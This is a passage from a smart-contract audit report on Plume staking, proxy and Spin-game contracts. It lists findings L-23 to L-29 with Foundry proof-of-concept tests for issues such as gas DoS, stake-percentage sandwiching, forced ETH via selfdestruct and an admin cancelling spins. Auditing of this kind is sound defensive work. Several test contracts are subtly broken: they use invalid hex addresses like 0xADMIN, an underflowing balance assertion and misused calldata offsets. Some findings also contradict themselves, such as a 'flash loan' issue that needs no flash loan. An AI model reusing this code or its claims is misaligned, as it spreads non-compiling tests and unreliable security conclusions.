    // Using addresses for facets as we don't need to deploy the full diamond
    StakingFacet stakingFacet;
    ValidatorFacet validatorFacet;
    ManagementFacet managementFacet;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address validatorAdmin = makeAddr("validatorAdmin");

    uint256 constant MIN_STAKE = 1 ether;

    function setUp() public {
        // This is a simplified setup. We are using direct contract instances 
        // instead of a full diamond proxy to isolate the facet logic.
        stakingFacet = new StakingFacet();
        validatorFacet = new ValidatorFacet();
        managementFacet = new ManagementFacet();

        // Initialize storage values needed for the test
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.minStakeAmount = MIN_STAKE;
        $.cooldownInterval = 1 days;

        vm.deal(victim, 100 ether);
        vm.deal(attacker, 100 ether);
    }

    function test_DoS_On_Withdraw() public {
        uint16 validatorCount = 200;

        // 1. Attacker forces victim to have stakes with many validators
        for (uint16 i = 1; i <= validatorCount; i++) {
            // In a real scenario, these validators would be added via ValidatorFacet
            // We mock their existence directly in storage for this test.
            PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
            $.validatorExists[i] = true;
            $.validators[i].active = true;
            $.validators[i].maxCapacity = 1_000_000 ether;
            $.validators[i].commission = 1000; // 10%

            vm.prank(attacker);
            stakingFacet.stakeOnBehalf{value: MIN_STAKE}(i, victim);
        }

        // 2. Victim has their own funds to withdraw
        vm.startPrank(victim);
        // Stake and unstake to create a withdrawable balance
        stakingFacet.stake{value: 10 ether}(1);
        stakingFacet.unstake(1, 10 ether);

        // Fast-forward time to make the cooldown mature
        vm.warp(block.timestamp + 2 days);
        vm.stopPrank();

        // 3. Victim attempts to withdraw
        vm.prank(victim);
        uint256 gasStart = gasleft();
        stakingFacet.withdraw();
        uint256 gasUsed = gasStart - gasleft();

        // 4. Assert gas used is extremely high, indicating a DoS vector
        // A typical withdraw might be < 200k gas. Looping over 200 validators will be > 4M gas.
        console.log("Gas used for withdraw with %d validator stakes: %d", validatorCount, gasUsed);
        assertGt(gasUsed, 4_000_000, "Gas cost should be very high due to unbounded loop");

        // With enough validators, this would exceed block gas limit and revert.
        assertEq(victim.balance, 10 ether + (90 ether - MIN_STAKE * validatorCount)); // Check balance reflects withdrawal
    }
}
```

## Suggested Mitigation
Optional micro-optimisation: store a separate `uint16 validatorCountPerUser` and short-circuit when it is zero, or add a constant upper bound on validators per user (e.g. 100). No urgent change required.

## [L-23]. Flash Loan Economic Manipulation issue in StakingFacet::_validateValidatorPercentage

## Description
The function `_validateValidatorPercentage` calculates a validator's share of the total stake. This check can be manipulated using a flash loan to temporarily inflate the `$.totalStaked` denominator. An attacker can use this to bypass the `maxValidatorPercentage` check, allowing a validator to accumulate a stake percentage that is higher than the protocol's intended limit. This undermines a key mechanism for ensuring stake decentralization.

## Impact
An attacker can temporarily concentrate more stake on a validator than the configured maxValidatorPercentage by sandwiching a victim-stake between an "inflate" and a later "deflate" transaction. Although no funds are stolen, decentralisation guarantees are weakened because governance and reward share can momentarily exceed the intended cap until the attacker removes the temporary stake.

## Proof of Concept
1. Block N: Attacker sends TX1 staking 9 000 ETH to dummy validator B.  
2. Same block, validator-selection algorithm picks up TX2 from Alice staking 10 ETH to validator A. Because totalStaked now equals 10 000 ETH, the percentage check sees only 1.05 % for validator A and allows the stake.  
3. Block N + 1: Attacker unstakes the 9 000 ETH (TX3). Final distribution is 105 / 1 010 = 10.39 %, above the 10 % cap.  
No flash-loan is needed; attacker capital is locked only for one block.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;
import "forge-std/Test.sol";
import {StakingFacet} from "contracts/plume/src/facets/StakingFacet.sol";
contract PercentageSandwich is Test {
    StakingFacet facet;
    address alice = vm.addr(1);
    uint16 A = 1;
    uint16 B = 2;

    function setUp() public {
        facet = new StakingFacet();
        facet.setMinStakeAmount(1 ether);
        facet.setMaxValidatorPercentage(1000); // 10 %
        facet.addValidator(A,0,address(0),address(0),"","",address(0),type(uint256).max);
        facet.addValidator(B,0,address(0),address(0),"","",address(0),type(uint256).max);
        vm.deal(address(this),10_000 ether);
        vm.deal(alice,10 ether);
        // seed: 95 ETH on A, 905 ETH on B so total = 1 000 ETH
        facet.stake{value:905 ether}(B);
        facet.stake{value:95 ether}(A);
    }

    function testSandwich() public {
        // ---- TX1 (attacker) ----
        facet.stake{value:9000 ether}(B);
        // ---- TX2 (victim, same block after TX1) ----
        vm.prank(alice);
        facet.stake{value:10 ether}(A);
        // ---- mine next block & TX3 attacker removes stake ----
        vm.roll(block.number + 1);
        facet.unstake(B,9000 ether);
        // final check
        uint256 tot = facet.totalAmountStaked();
        uint256 aStake = facet.getUserValidatorStake(address(this),A)+facet.getUserValidatorStake(alice,A);
        assertGt((aStake*10_000)/tot,1000);
    }
}

## Suggested Mitigation
Perform the percentage-of-total-stake validation before mutating `totalStaked`, e.g. compute `prospectiveTotal = $.totalStaked + stakeAmount` and compare against that, or store `previousTotalStaked` and use it in the division instead of `$.totalStaked`.

## [L-24]. Unexpected Eth issue in PlumeProxy::NA

## Description
The `PlumeProxy` contract is designed to not hold Ether, as enforced by its `receive()` external payable function which unconditionally reverts. However, Ether can be forcibly sent to any contract address through mechanisms that bypass the `receive` function, such as another contract calling `selfdestruct(payable(proxyAddress))` or by pre-funding an address before contract deployment. Since `PlumeProxy` does not have any function to withdraw Ether from its own balance, any funds sent this way will be permanently locked in the contract.

## Impact
Any Ether forcibly sent to the proxy contract address will be permanently lost. While this does not directly endanger funds managed by the protocol's logic, it can lead to a loss of funds for users or other protocols that mistakenly send ETH to the proxy.

## Proof of Concept
1. An attacker or user deploys a contract (`Destroyer`) and funds it with 1 ETH.
2. The `Destroyer` contract calls `selfdestruct`, specifying the `PlumeProxy` contract address as the beneficiary.
3. The `selfdestruct` opcode forcibly transfers the 1 ETH to the `PlumeProxy` contract's balance, bypassing the reverting `receive()` function.
4. The 1 ETH is now held by the `PlumeProxy` contract.
5. There is no function available in `PlumeProxy` or its standard `ERC1967Proxy` parent to withdraw this ETH, so it is locked forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// --- Contract under test (from the prompt) ---

contract PlumeProxy is ERC1967Proxy {
    error ETHTransferUnsupported();
    bytes32 public constant PROXY_NAME = keccak256("PlumeProxy");

    constructor(address logic, bytes memory data) ERC1967Proxy(logic, data) { }

    receive() external payable {
        revert ETHTransferUnsupported();
    }
}

// --- Test Setup ---

// A mock logic contract, as the proxy needs one.
contract MockLogic {
    function version() public pure returns (string memory) {
        return "1.0";
    }
}

// A contract that can self-destruct and send its balance.
contract Destroyer {
    constructor() payable {}

    function destroyAndSend(address payable target) external {
        selfdestruct(target);
    }
}


contract PlumeProxyAuditTest is Test {
    PlumeProxy public proxy;
    MockLogic public logic;

    function setUp() public {
        logic = new MockLogic();
        // Deploy the proxy with no initialization data
        proxy = new PlumeProxy(address(logic), "");
    }

    /// @notice This test demonstrates that ETH can be forcibly sent to the
    /// PlumeProxy contract and become permanently locked.
    function test_poc_stuck_eth_via_selfdestruct() public {
        // 1. Verify the proxy's initial balance is 0.
        assertEq(address(proxy).balance, 0, "Proxy initial balance should be zero");

        // 2. Deploy a 'Destroyer' contract, funding it with 1 ETH.
        Destroyer destroyer = new Destroyer{value: 1 ether}();
        assertEq(address(destroyer).balance, 1 ether, "Destroyer should have 1 ETH");

        // 3. The Destroyer contract self-destructs, forcibly transferring its
        // entire ETH balance to the PlumeProxy contract. This bypasses the
        // proxy's `receive()` function check.
        destroyer.destroyAndSend(payable(address(proxy)));

        // 4. Assert that the proxy's balance is now 1 ETH.
        assertEq(address(proxy).balance, 1 ether, "Proxy balance should be 1 ETH after selfdestruct");

        // At this point, the 1 ETH is permanently locked within the proxy contract.
        // There is no function to withdraw it.
    }
}
```

## Suggested Mitigation
It is a best practice for contracts that might unintentionally receive Ether to have an emergency withdrawal function. Since `PlumeProxy` follows a proxy pattern intended to be logic-less, this withdrawal logic should be placed within the implementation contract that the proxy points to. An admin-only function can be added to the logic contract, which, when called through the proxy, can access and transfer the proxy's Ether balance to a designated recipient.

Example for the implementation contract:

```solidity
// In the logic/implementation contract (e.g., within a management facet)

/**
 * @notice Withdraws any ETH balance that may have been accidentally
 * sent or forcibly transferred to the proxy contract's address.
 * @param recipient The address to receive the ETH.
 */
function emergencyWithdrawProxyETH(address payable recipient) external onlyAdmin {
    // This function will be called via DELEGATECALL, so `address(this)`
    // refers to the proxy's address and `address(this).balance` is the proxy's balance.
    uint256 balance = address(this).balance;
    require(balance > 0, "No ETH to withdraw");
    (bool success, ) = recipient.call{value: balance}("");
    require(success, "ETH transfer failed");
}
```

## [L-25]. Unexpected Eth issue in PlumeProxy::receive

## Description
The `PlumeProxy` contract has a `receive()` function that reverts to prevent accidental ETH transfers. However, ETH can still be forcibly sent to the contract address via `selfdestruct` from another contract. The proxy contract itself contains no logic to withdraw these funds; it delegates all calls to an implementation contract. If the implementation contract lacks a function to withdraw ETH from the proxy's balance, any funds sent via `selfdestruct` will be permanently locked. This represents a potential loss of value, even if it doesn't directly affect the protocol's core operations or user funds.

## Impact
Permanent loss of any Ether that is forcibly sent to the proxy contract's address via `selfdestruct`. While this does not directly endanger user funds within the staking protocol, it creates a scenario where value can be permanently destroyed.

## Proof of Concept
1. An attacker or user deploys a contract `ForcedSender` and funds it with ETH.
2. The `ForcedSender` contract calls `selfdestruct(payable(address(plumeProxy)))`.
3. The entire ETH balance of `ForcedSender` is transferred to the `PlumeProxy` contract.
4. Since `PlumeProxy` has no function to handle ETH withdrawal, and its logic contract might not have one either, the ETH becomes permanently trapped in the proxy contract with no way to recover it.

## Proof of Code
```solidity
// test/PlumeProxy.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeProxy} from "../src/proxy/PlumeProxy.sol";

// A dummy logic contract without an ETH withdrawal function
contract LogicContract {
    function getMeaningOfLife() external pure returns (uint256) {
        return 42;
    }
}

// A contract that can self-destruct and force-send its ETH balance
contract ForcedSender {
    constructor() payable {}

    function sendToTarget(address payable target) public {
        selfdestruct(target);
    }
}

contract PlumeProxyStuckEthTest is Test {
    PlumeProxy proxy;
    LogicContract logic;

    function setUp() public {
        logic = new LogicContract();
        // Deploy the proxy pointing to the logic contract, with no initialization data
        proxy = new PlumeProxy(address(logic), "");
    }

    function test_CanLockEthViaSelfDestruct() public {
        // Initial balance of the proxy is 0
        assertEq(address(proxy).balance, 0);

        // Deploy the ForcedSender with 1 ETH
        ForcedSender sender = new ForcedSender{value: 1 ether}();
        assertEq(address(sender).balance, 1 ether);

        // The ForcedSender self-destructs, sending its ETH to the proxy
        sender.sendToTarget(payable(address(proxy)));

        // The proxy now holds 1 ETH
        assertEq(address(proxy).balance, 1 ether);

        // There is no function in PlumeProxy or the associated LogicContract
        // to withdraw this ETH. It is now permanently stuck.
        // Attempting a direct transfer also fails due to the receive() revert.
        (bool success, ) = address(proxy).call{value: 1 wei}("");
        assertFalse(success, "Direct ETH transfer should revert as expected");
    }
}
```

## Suggested Mitigation
The implementation contract, which the `PlumeProxy` delegates its calls to, should include a permissioned function to withdraw any Ether balance from the contract address. This provides a recovery mechanism for any funds that are forcibly sent to the proxy. The function should be protected by strong access control, allowing only a trusted role (e.g., an admin or owner) to execute it.

Example for the implementation contract:
```solidity
import "@openzeppelin/contracts/access/Ownable.sol"; // Or a role-based access control system

contract RecoverableLogic is Ownable {
    // ... other contract logic ...

    /**
     * @notice Allows the owner to withdraw any ETH from the contract's balance.
     * @dev This is a recovery mechanism for ETH sent via selfdestruct.
     */
    function withdrawStuckETH() external onlyOwner {
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "ETH_WITHDRAWAL_FAILED");
    }

    // A receive function might be needed if the contract is intended to ever hold ETH.
    receive() external payable {}
}
```

## [L-26]. Zero Code issue in Spin::initialize

## Description
The `initialize` function, as well as admin setters like `setRaffleContract`, accept addresses for critical contract dependencies (`supraRouter`, `dateTime`, `raffleContract`) without verifying that the provided address contains code. If a zero address or an EOA is provided, the contract will not revert on setup, but will fail during runtime. For example, if `supraRouterAddress` is an EOA, `supraRouter.generateRequest(...)` will return default values (e.g., nonce = 0), causing all user spin requests to collide and overwrite each other in the `userNonce` mapping. This breaks the core functionality and can lead to loss of user funds (spin fees).

## Impact
If the deployer (or an admin later) configures `supraRouter`, `dateTime` or `raffleContract` with an EOA or the zero address the contract will revert at the first external-function call that expects code. For example, `startSpin()` will revert when it tries to execute `supraRouter.generateRequest(...)`, making the whole Daily-Spin feature permanently inoperable. No user funds can be stolen, but the product is bricked until redeployed or upgraded.

## Proof of Concept
1. Deploy `Spin` and call `initialize()` with `supraRouterAddress = address(0)` and a valid `dateTime` mock (or whitelist the test user to skip the DateTime call).
2. Admin enables spinning via `setEnableSpin(true)`.
3. A whitelisted user calls `startSpin()` paying the correct fee.
4. The transaction reverts because the high-level call to `generateRequest()` attempts to decode a `uint256` from empty return data coming from a non-contract address.

Result: spinning is impossible until the implementation is upgraded, proving a denial-of-service condition.

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";

contract ZeroCodeRouterTest is Test {
    Spin spin;
    address admin = address(0xADMIN);
    address user  = address(0xBEEF);

    function setUp() public {
        vm.startPrank(admin);
        spin = new Spin();
        // initialize with zero-code SupraRouter but keep a dummy DateTime address
        spin.initialize(address(0), address(0x1234));
        spin.setEnableSpin(true);
        spin.whitelist(user); // skip DateTime calls inside canSpin()
        vm.stopPrank();

        vm.deal(user, 3 ether);
    }

    function test_startSpinRevertsWhenRouterHasNoCode() public {
        vm.prank(user);
        vm.expectRevert(); // no specific revert string – ABI decode panic
        spin.startSpin{value: spin.getSpinPrice()}();
    }
}

## Suggested Mitigation
Before storing external contract addresses, add `require(addr.code.length > 0, "address is not a contract")`. Apply this check in `initialize`, `setRaffleContract`, and any future setter that accepts contract addresses. This guarantees the system cannot be configured into an unusable state.

## [L-27]. Randomness issue in Spin::startSpin

## Description
The `clientSeed` used for generating a random number via the Supra VRF oracle is created with `uint256(keccak256(abi.encodePacked(admin, block.timestamp)))`. In this implementation, the `admin` address is a constant state variable, and `block.timestamp` is the same for all transactions within a single block. Consequently, every call to `startSpin()` within the same block will generate an identical `clientSeed`. This is a significant weakness as it reduces the sources of entropy for the VRF request and makes the system overly reliant on the oracle's internal nonce mechanism to differentiate requests. A fundamental principle of using VRFs is to provide a unique seed for every request.

## Impact
Calls made in the same block are supplied with an identical clientSeed, reducing the amount of user-supplied entropy that reaches the VRF. Although Supra VRF adds its own per-request nonce so the final output remains unpredictable, re-using the very same seed is a bad practice and could become a problem if the oracle logic ever changes or if other parameters are later added that rely on the seed being unique.

## Proof of Concept
1. Two different users, Alice and Bob, decide to play the spin game.
2. Both Alice's and Bob's transactions calling `startSpin()` are included in the same block by a miner.
3. The `Spin` contract executes `startSpin()` for Alice, calculating `clientSeed = keccak256(abi.encodePacked(admin, block.timestamp))`.
4. The contract then executes `startSpin()` for Bob, calculating the `clientSeed` with the exact same `admin` address and `block.timestamp`.
5. As a result, both VRF requests are generated with the identical `clientSeed`, increasing the risk of predictability and manipulation.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";

// ────────────────────────────────────────────────────────────
// Minimal mocks just to compile and show the duplicated seed
// ────────────────────────────────────────────────────────────

interface IDateTime {
    function getYear(uint256) external pure returns (uint16);
    function getMonth(uint256) external pure returns (uint8);
    function getDay(uint256) external pure returns (uint8);
}

contract MockDateTime is IDateTime {
    function getYear(uint256) external pure override returns (uint16) { return 2024; }
    function getMonth(uint256) external pure override returns (uint8) { return 1; }
    function getDay(uint256) external pure override returns (uint8) { return 1; }
}

contract MockSupraRouter is ISupraRouterContract {
    uint256 public lastSeed;

    function generateRequest(
        string calldata,
        uint8,
        uint256,
        uint256 _clientSeed,
        address
    ) external returns (uint256) {
        lastSeed = _clientSeed;
        return 1; // dummy nonce
    }
}

contract SeedUniquenessTest is Test {
    Spin spin;
    MockSupraRouter supraRouter;
    MockDateTime dateTime;

    address admin = address(0xA11CE);
    address user1 = address(0xB0B);
    address user2 = address(0xC0DE);
    uint256 constant SPIN_PRICE = 2 ether;

    function setUp() public {
        vm.deal(admin, 10 ether);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);

        supraRouter = new MockSupraRouter();
        dateTime   = new MockDateTime();

        spin = new Spin();
        vm.prank(admin);
        spin.initialize(address(supraRouter), address(dateTime));
        vm.prank(admin);
        spin.setEnableSpin(true);
    }

    function testDuplicateSeedSameBlock() public {
        // place both transactions in the same block
        vm.prank(user1);
        spin.startSpin{value: SPIN_PRICE}();
        uint256 firstSeed = supraRouter.lastSeed();

        vm.prank(user2);
        spin.startSpin{value: SPIN_PRICE}();
        uint256 secondSeed = supraRouter.lastSeed();

        assertEq(firstSeed, secondSeed, "clientSeed should be identical when two spins occur in the same block");
    }
}

## Suggested Mitigation
Include user-specific data such as msg.sender and/or a contract-side per-request counter when constructing clientSeed:

uint256 clientSeed = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao, userNonceIncrement[msg.sender]++)));

This guarantees every request receives a distinct seed while preserving compatibility with the oracle.

## [L-28]. Access Control issue in Spin::cancelPendingSpin

## Description
The `cancelPendingSpin` function allows an account with `ADMIN_ROLE` to cancel a user's in-flight spin request. While intended as an escape hatch for stuck transactions, it can be abused. A malicious or compromised admin could monitor pending oracle callbacks and front-run the `handleRandomness` transaction for a large payout (like a Jackpot) by calling `cancelPendingSpin`. This would cancel the user's winning spin. Crucially, the user's `spinPrice` fee is not refunded, meaning the admin can profit from this action by collecting fees while denying rewards. This centralization of power undermines the fairness and trustlessness of the game.

## Impact
The function allows an address that already owns ADMIN_ROLE to void an in-flight spin, causing the player to lose the spin fee and any prospective reward. Because the same role can pause the game, withdraw the contract balance, change reward tables, or even upgrade the implementation, this extra ability does not meaningfully increase the threat surface—it only adds another way the trusted admin can disappoint users. The financial loss for a single user is bounded to the paid spin fee; jackpots are never transferred to the admin through this path.

## Proof of Concept
1. A victim user calls `startSpin()` and pays the `spinPrice`. A request is sent to the Supra oracle for a random number.
2. A malicious admin runs an off-chain process that monitors oracle transactions. They see a pending `handleRandomness` transaction for the victim's nonce that will result in a jackpot win.
3. The admin immediately calls `cancelPendingSpin(victim_address)`, front-running the oracle's callback transaction.
4. The user's spin state (`isSpinPending`, `userNonce`, `pendingNonce`) is cleared from the contract's storage.
5. When the oracle's `handleRandomness` transaction is finally mined, it reverts with `InvalidNonce()` because `userNonce[nonce]` was deleted.
6. The victim is denied their jackpot win and has permanently lost their `spinPrice` fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";

contract MockSupraRouter is ISupraRouterContract {
    uint256 public nextNonce = 1;
    address public spinContract;

    function setSpinContract(address _spinContract) public {
        spinContract = _spinContract;
    }

    function generateRequest(
        string memory, // callbackSignature
        uint8, // rngCount
        uint256, // numConfirmations
        uint256, // clientSeed
        address // clientAddress
    ) external returns (uint256) {
        uint256 nonce = nextNonce++;
        // The real router would call back later, we simulate it manually
        return nonce;
    }

    function manualCallback(uint256 nonce, uint256[] memory rngList) public {
        Spin(spinContract).handleRandomness(nonce, rngList);
    }
}

contract MockDateTime is IDateTime {
    function getYear(uint256) external pure returns (uint16) {
        return 2024;
    }

    function getMonth(uint256) external pure returns (uint8) {
        return 7;
    }

    function getDay(uint256) external pure returns (uint8) {
        return 1;
    }
}

contract MaliciousAdminTest is Test {
    Spin public spin;
    MockSupraRouter public supraRouter;
    MockDateTime public dateTime;
    address public admin = address(0xADMIN);
    address public victim = address(0xVICTIM);
    uint256 spinPrice;

    function setUp() public {
        vm.deal(admin, 10 ether);
        vm.deal(victim, 10 ether);

        supraRouter = new MockSupraRouter();
        dateTime = new MockDateTime();

        // Deploy Spin contract proxy and implementation
        address spinImpl = address(new Spin());
        bytes memory initData = abi.encodeWithSelector(
            Spin.initialize.selector,
            address(supraRouter),
            address(dateTime)
        );
        spin = Spin(payable(address(new ERC1967Proxy(spinImpl, initData))));
        
        // Transfer admin role to our test admin
        vm.prank(address(this)); // initial deployer is admin
        spin.grantRole(spin.ADMIN_ROLE(), admin);

        supraRouter.setSpinContract(address(spin));
        spinPrice = spin.spinPrice();

        vm.prank(admin);
        spin.setCampaignStartDate(block.timestamp);
        vm.prank(admin);
        spin.setEnableSpin(true);
    }

    function test_AdminCanCancelWinningSpin() public {
        // 1. Victim starts a spin
        vm.startPrank(victim);
        uint256 victimBalanceBefore = victim.balance;
        spin.startSpin{value: spinPrice}();
        vm.stopPrank();

        uint256 victimBalanceAfterSpin = victim.balance;
        assertEq(victimBalanceBefore - victimBalanceAfterSpin, spinPrice, "Victim should pay spin price");

        uint256 pendingNonce = spin.pendingNonce(victim);
        assertTrue(pendingNonce > 0, "Spin should be pending");

        // 2. Malicious admin sees a jackpot is coming. The random number will be small.
        // We simulate this by preparing a jackpot-winning random number.
        uint256 jackpotRng = 0; // The smallest possible number, guaranteed to be < jackpotThreshold
        uint256[] memory jackpotRngList = new uint256[](1);
        jackpotRngList[0] = jackpotRng;

        // 3. Admin front-runs the oracle callback and cancels the spin
        vm.prank(admin);
        spin.cancelPendingSpin(victim);
        assertFalse(spin.isSpinPending(victim), "Spin should be cancelled");
        assertEq(spin.userNonce(pendingNonce), address(0), "Nonce mapping should be deleted");

        // 4. The oracle callback arrives but fails
        vm.expectRevert(bytes("InvalidNonce()"));
        supraRouter.manualCallback(pendingNonce, jackpotRngList);

        // 5. Final state check: Victim lost money and got no rewards
        uint256 victimBalanceFinal = victim.balance;
        assertEq(victimBalanceAfterSpin, victimBalanceFinal, "Victim should not be refunded");

        (,,, uint256 raffleTickets, uint256 raffleBalance,, uint256 plume) = spin.getUserData(victim);
        assertEq(raffleTickets + raffleBalance + plume, 0, "Victim should have no rewards");
        (, uint256 jackpotPrize,) = spin.getWeeklyJackpot();
        assertTrue(jackpotPrize > 0, "There should be a jackpot prize");
        console.log("Victim paid", spinPrice, "and was denied a jackpot of", jackpotPrize, "PLUME");
    }
}

contract ERC1967Proxy {
    constructor(address _logic, bytes memory _data) {
        assembly {
            sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, _logic)
            if iszero(iszero(_data.length)) {
                let r := delegatecall(gas(), _logic, _data.offset, _data.length, 0, 0)
            }
        }
    }
    fallback() external payable {
        assembly {
            let _logic := sload(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
            calldatacopy(0, 0, calldatasize())
            let r := delegatecall(gas(), _logic, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch r case 0 {revert(0, returndatasize())} default {return (0, returndatasize())}
        }
    }
}
```

## Suggested Mitigation
If the project wants to make the escape hatch more transparent or trust-minimised, gate `cancelPendingSpin` behind (a) a minimum delay (e.g. > 1 hour after `startSpin`) and (b) an automatic refund of the `spinPrice`. Otherwise, clearly document the centralised nature of the admin role so users understand the associated trust assumptions.

## [L-29]. Timestamp Dependent Logic issue in Spin::canSpin

## Description
The contract uses two different and potentially inconsistent mechanisms to determine the passage of a 'day'. The `canSpin` modifier, which controls a user's ability to spin, relies on an external `IDateTime` contract to check if a spin has already occurred on the current calendar day. In contrast, the `_computeStreak` function, which is critical for calculating rewards (especially raffle tickets and jackpot eligibility), uses integer division of `block.timestamp` by `SECONDS_PER_DAY` (86400). If the `IDateTime` contract has a different timezone implementation, handles leap years/seconds differently, or is buggy/malicious, the two logics can diverge. This can lead to scenarios where a user is permitted to spin by `canSpin` but `_computeStreak` does not register it as a new day, causing the user to pay for a spin without their streak increasing, thereby losing potential rewards.

## Impact
This logical inconsistency can lead to degraded user experience and financial loss. Users might be unfairly blocked from spinning, or more critically, pay for a spin that does not correctly increment their daily streak. Since streak count directly impacts the number of raffle tickets won and is a prerequisite for jackpot eligibility, failing to increment the streak is a direct loss of expected value for the user. This undermines the fairness of the game mechanics.

## Proof of Concept
1. The Spin contract is initialized with a mock `IDateTime` contract whose definition of a 'day' can be manipulated for the test.
2. A user spins at `T1` (e.g., 10:00 AM). `_computeStreak` calculates their streak as 1, and `lastSpinTimestamp` is set to `T1`.
3. Time is advanced to `T2` (e.g., 11:00 AM on the same day). According to the `block.timestamp / 86400` logic, `T1` and `T2` are on the same day.
4. The mock `IDateTime` contract is manipulated to report that `T2` is on a new calendar day relative to `T1`.
5. The user calls `startSpin()` again. The `canSpin` modifier checks with the mock `IDateTime` contract, which confirms it's a new day, so the check passes.
6. The spin is processed. When `_computeStreak` is called inside `handleRandomness`, it compares `T1 / 86400` and `T2 / 86400`. Since these are equal, it concludes the spin is on the same day and does not increment the streak.
7. The user has now paid for two spins but their streak count remains 1 instead of 2.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";

// ------------------------------------------------------------
// Minimal mock for SupraRouter that gives deterministic RNG
// ------------------------------------------------------------
contract MockSupraRouter is ISupraRouterContract {
    address public spin;
    uint256 private _nonce;
    uint256[] private _rng;

    function setSpinContract(address _spin) external {
        spin = _spin;
    }

    function setNextRng(uint256[] calldata rng) external {
        _rng = rng;
    }

    function generateRequest(
        string calldata,
        uint8,
        uint256,
        uint256,
        address
    ) external override returns (uint256 nonce) {
        nonce = ++_nonce;
    }

    function manualCallback(uint256 nonce, uint256[] calldata) external {
        Spin(spin).handleRandomness(nonce, _rng);
    }
}

// ------------------------------------------------------------
// MockDateTime that can be told to pretend we moved to a new day
// ------------------------------------------------------------
contract MockDateTime is IDateTime {
    int256 public dayOffset; // in days (can be negative)
    uint256 constant SECONDS_PER_DAY = 86_400;

    function setDayOffset(int256 _days) external {
        dayOffset = _days;
    }

    // ----- IDateTime impl (only the 3 functions used by Spin) -----
    function getYear(uint256) external pure override returns (uint16) {
        return 2024;
    }

    function getMonth(uint256) external pure override returns (uint8) {
        return 7; // arbitrary fixed month
    }

    function getDay(uint256 ts) external view override returns (uint8) {
        uint256 shifted = uint256(int256(ts) + dayOffset * int256(SECONDS_PER_DAY));
        // very rough conversion, good enough for equality checks
        return uint8((shifted / SECONDS_PER_DAY) % 31 + 1);
    }
}

contract InconsistentDayTest is Test {
    Spin public spin;
    MockSupraRouter public supraRouter;
    MockDateTime public dateTime;
    address public user = address(0xBEEF);
    uint256 public spinPrice;

    function setUp() public {
        vm.deal(user, 5 ether);

        // deploy mocks
        supraRouter = new MockSupraRouter();
        dateTime = new MockDateTime();

        // deploy Spin via proxy-less pattern for brevity
        spin = new Spin();
        spin.initialize(address(supraRouter), address(dateTime));
        spin.setCampaignStartDate(block.timestamp);
        spin.setEnableSpin(true);
        supraRouter.setSpinContract(address(spin));
        spinPrice = spin.spinPrice();
    }

    function test_StreakNotIncrementedWhenDateLogicDiverges() public {
        uint256[] memory rng = new uint256[](1);
        rng[0] = 999_999; // force "Nothing" so reward value is irrelevant
        supraRouter.setNextRng(rng);

        // 1st spin (Day 0)
        vm.prank(user);
        spin.startSpin{value: spinPrice}();
        uint256 nonce1 = spin.pendingNonce(user);
        supraRouter.manualCallback(nonce1, rng);
        assertEq(spin.currentStreak(user), 1, "streak should start at 1");

        // Advance only 1 hour – still same UTC day for internal math
        vm.warp(block.timestamp + 1 hours);

        // Tell MockDateTime to pretend we've crossed into next calendar day
        dateTime.setDayOffset(1);

        // 2nd spin, canSpin() will pass because external calendar says new day
        supraRouter.setNextRng(rng);
        vm.prank(user);
        spin.startSpin{value: spinPrice}();
        uint256 nonce2 = spin.pendingNonce(user);
        supraRouter.manualCallback(nonce2, rng);

        // Internal streak uses raw timestamp division, so it stayed the same
        assertEq(spin.currentStreak(user), 1, "streak DID NOT increment – logic diverged");
    }
}

## Suggested Mitigation
The contract should use a single, consistent source of truth for all date- and time-based calculations. The dependency on the external `IDateTime` contract should be removed, and the logic in `canSpin` should be refactored to use the same internal `block.timestamp / SECONDS_PER_DAY` method that `_computeStreak` uses. This makes the day calculation logic self-contained, consistent, and removes a potential point of failure or manipulation from an external contract.

```solidity
// Remove the IDateTime interface and state variable.

// Refactor the canSpin modifier:
modifier canSpin() {
    // Early return if the user is whitelisted
    if (whitelists[msg.sender]) {
        _;
        return;
    }

    uint256 lastSpinTs = userData[msg.sender].lastSpinTimestamp;

    // A new user can always spin.
    if (lastSpinTs > 0) {
        uint256 lastDaySpun = lastSpinTs / SECONDS_PER_DAY;
        uint256 today = block.timestamp / SECONDS_PER_DAY;

        if (today == lastDaySpun) {
            revert AlreadySpunToday();
        }
    }

    _;
}

// The `isSameDay` function and all calls to `IDateTime` can be removed.
```

## [L-30]. Frontrun/Backrun/Sandwhich MEV issue in Spin::setSpinPrice

## Description
